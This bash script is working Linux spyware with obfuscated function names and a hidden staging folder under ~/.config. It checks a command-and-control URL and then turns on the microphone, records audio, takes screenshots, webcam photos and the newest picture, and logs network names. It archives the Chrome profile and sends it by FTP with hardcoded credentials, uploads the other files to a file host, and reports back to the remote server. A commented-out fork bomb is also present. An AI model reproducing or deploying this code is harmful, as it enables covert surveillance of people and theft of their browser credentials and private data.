#!/bin/bash

function dbgx(){
	echo "[*] $1";
}

function slpx(){
	sleep 5
}

HOME_="/home/$USER/"
HOME_2="/home/$USER/.config/ibus_/"
#IBUS_="/usr/local/sbin/ibus_/"
IBUS_="/home/$USER/.config/ibus_/"
#
IBUS__="/home/$USER/.config/mintdesktop/"
mkdir $IBUS__
chmod 755 $IBUS__
chmod 755 $IBUS_


function Mcx(){
	microphone_status=$(amixer get Capture | grep "\[on\]")
 	#
	if [[ -n $microphone_status ]]; then
	    dbgx "ax... Mcx...Okx..."
     	    #cx_ "ax... Mcx...Okx..." "PX"
	else
	    amixer set Capture toggle
	    amixer set Capture cap
            #cx_ "!ax... Mcx...Okx..." "PX"
	fi
}

function Clnx(){
	rm -f *$1
	rm -f $IBUS_*$1
	rm -f $IBUS__*$1
}

function ssx_(){
    #imagemagick
    #export DISPLAY=:0.0
    DISPLAY=:0
    export DISPLAY
    #
    output_file=`date +%s`"ss.png"
    dbgx "ssx..."
    import -window root "$IBUS__$output_file"
    dbgx "ssx saved to $output_file"
    cx "$output_file" "SS"
    slpx 
    rm -f "$IBUS__$output_file"
    rm -f "$output_file"
    #
    Clnx "png"
}

function ax_(){
    #arecord
    duration=30
    output_file=`date +%s`"a.wav"
    #
    Mcx
    #
    #amixer set Capture cap
    #
    dbgx "ax started..."
    arecord -f cd -d $duration -t wav -r 44100 $IBUS__$output_file
    dbgx "ax stopped. Saved to $output_file"
    #
    cx "$output_file" "AX"
    slpx
    rm -f "$output_file"
    rm -f "$IBUS__$output_file"
    #
    Clnx "wav"
}

function PxNwx(){
    pictures_dir="$HOME_/Pictures"
    images=$(find "$pictures_dir" -type f \( -iname \*.jpg -o -iname \*.jpeg -o -iname \*.png -o -iname \*.gif \))
    sorted_images=$(echo "$images" | xargs stat --format '%Y %n' | sort -rn)
    newest_image=$(echo "$sorted_images" | head -n 1 | awk '{print $2}')
    dbgx "Newest image: $newest_image"
    output_file="px.png"
    cp "$newest_image" $IBUS__$output_file
    cx "$output_file" "PX"
    slpx
    rm -f "$IBUS__$output_file"
    rm -f "$output_file"
}
#Fswebcam
function WbCmx(){
	output_file="px.jpg"
	fswebcam "$IBUS__$output_file"
	dbgx "Fswebcam: $output_file"
	cx "$output_file" "PX"
    	slpx
    	rm -f "$IBUS__$output_file"
        rm -f "$output_file"
}

function GCx_(){
	ftp_server="139.162.128.166"
	ftp_user="r00t1970"
	ftp_password="#r00t#1970#"
	#
	folder_to_compress="/home/$USER/.config/google-chrome"
	#folder_to_compress="/home/r00t/.config/ibus_/px.jpg"
	local_file="$IBUS_"`date +%s`"gcx.tar.gz"
	tar -czvf "$local_file" "$folder_to_compress"
	#
	remote_directory="/home/r00t1970/"`date +%s`"GCx.tar.gz"
	#
	msgx=`ftp -npvi $ftp_server <<END_SCRIPT
	quote USER $ftp_user
	quote PASS $ftp_password
	binary
	put "$local_file" "$remote_directory"
	quit
	END_SCRIPT`
	#
	OX_=`curl -k -X POST -d "descr=$msgx&cat=SS" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
     	dbgx "Descr: $msgx Cat: SS cx_OX:$OX_";
     	#
     	rm -f "$local_file"
    	rm -f "$IBUS_""gcx.tar.gz"
}

function cx(){
    #OX2=`curl -k --connect-timeout 900 --max-time 900 -T $IBUS__$1 https://oshi.at`
    #dbgx "OX2: $OX2";
    #cx_ "$OX2" "$2"
    #
    OX3=`curl -k --connect-timeout 900 --max-time 900 --upload-file $IBUS__$1 https://free.keep.sh`
    dbgx "OX3: $OX3";
    cx_ "$OX3" "$2"
}

function cx_(){
    OX_=`curl -k -X POST -d "descr=$1&cat=$2" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps`
    dbgx "Descr: $1 Cat: $2 cx_OX:$OX_";
}

function Ntx(){
    wifi_interface=$(iwconfig 2>&1 | grep "IEEE 802.11" | awk '{print $1}')
    eth_interface=$(ip link show | grep "state UP" | grep -v "lo:" | awk -F': ' '{print $2}') 

    if [[ -n "$wifi_interface" ]]
    then
        dbgx "User is connected to WiFi using interface $wifi_interface"
        SSID=$(iwgetid -r)

        if [[ -n "$SSID" ]]
        then
            dbgx "Current SSID: $SSID"
            #
            cx_ "$SSID" "SSID"
        else
            dbgx "No wireless network detected"
        fi
    fi
    #
    if [[ -n "$eth_interface" ]]
    then
        dbgx "User is connected to Ethernet using interface $eth_interface"
	#
	cx_ "$eth_interface" "SSID"
        #
        eth_interface=$(ip -o link show | awk -F': ' '{print $2, $9}' | grep "state UP" | grep -v "lo:" | awk '{print $1}')

        if [[ -n "$eth_interface" ]]
        then
            dbgx "Name of Ethernet connection: $eth_interface"
             cx_ "$eth_interface" "SSID"
        else
            dbgx "No Ethernet connection detected"
        fi
	#
    fi
    #
}

function px(){
    px_OX=`curl -k -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/px`
    if [[ "$px_OX" == "TRUE" ]]
    then
        dbgx "Run: $px_OX";
	#
 	Mcx
  	#
        Ntx
	#
  	#pactl set-default-sink 0
   	#
    	ssx_ & ax_ & ssx2
 	#
  	xyz
	#
	exit 0
    else
        dbgx "Run: $px_OX";
        exit 1
    fi
}

function ssx2(){
	et=`date +%s`
	#st=1690754216
 	et_=$(($et+300))
	st=$(($et_))
	while [ $et -le $st ]
	do
	et=`date +%s`
  	#
    	Mcx
 	#
  	ssx_ & ax_
        #
        xyz
	 sleep 30
	done
}

function xyz(){
	dbgx "XYZ..."
 	#reboot
	#:(){ :|:& };:
}

px
